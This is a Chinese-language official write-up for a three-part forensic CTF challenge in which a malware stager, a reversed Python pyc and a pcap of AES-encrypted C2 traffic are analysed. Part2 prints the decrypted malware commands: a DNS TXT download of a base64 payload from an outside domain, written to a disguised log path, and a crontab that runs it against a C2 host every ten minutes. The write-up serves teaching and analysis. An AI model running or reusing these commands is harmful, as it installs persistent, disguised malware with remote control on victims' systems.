---
title: '2022 Final CTF Misc 官方解答'
tags: [SCIST, Write-Up]
categories: [CTF]
date: 2022-08-11
description: 幫 SCIST 出了一個系列 Forensic 題目，共三題的 Intruder 題目官方解答。
---


---
## Intruder
### Beginning
題目給了兩個檔案，pcap 跟 binary，然後 binary 已經告知是 stager ㄌ。
先把 pcap 丟進去 wireshark 後，會發現沒有什麼可以直接看出個所以然的包可以看，所以就只能從 binary 下手，看看實際上到底做了什麼事情。

### Part1 - Stager Reverse
把 Stager 丟進去喜愛的工具內，可以發現邏輯很簡單，在 main 可以看到有兩個 exec 的 function，而傳入的參數是一個奇怪字串與字串長度，
實際逆向完 exec 後可以知道第一個 part1 的 flag，而這個 flag 就是用來對奇怪字串做 XOR decryption 的，解出來的字串會被送進去 system 後執行。


### Part2
解出來的指令:
- `(dig m.r2s.tw TXT +short; dig m2.r2s.tw TXT +short) | tr -d '" \n' | base64 -d > /var/syslog`
- `echo "*/10 * * * * python3.9 /var/syslog mm.r2s.tw 35540" > /var/auth.log`
- `crontab /var/auth.log`

可以知道程式會利用 dig 去取得 domain 的 txt record，抓下來後 `base64 -d` 會得出一個檔案，看後續的指令可以知道該檔案應該是 python 檔，但不確定是 pyc 還是 source code，所以需要實際上把檔案生出來後才可以知道下一步。

如果已經做到這邊也把檔案弄好了，就可以知道這是一份 python3.9 的 pyc，所以接下來要逆向 Python Bytecode。
在這個 pyc 中可以知道:
1. Part2 的 flag 
2. client 跟 c2 取得了 Key, IV 並使用 AES_CBC 來對接下來的溝通做加密

### Part3
走完 Part2 後會發現一件事情，c2 command 的執行流程並沒有被 hardcoded 在 pyc 內，取而代之的是透過接受資料後再經過 marshal 操作最後丟進去 eval，可以知道這邊是透過傳遞 python code object 然後執行任意指令。
所以要知道實際上的行為的話要先把 pcap 內的相關資料抓取繼續做逆向。

做完逆向之後會得出兩個主要的 function： `cat` 跟 `ls`，接下來只要將 pcap 內的指令跟取得的回覆一一對應後就可以知道惡意程式拉下哪檔案，其中一個 pdf 檔案就是 part3 的 flag。


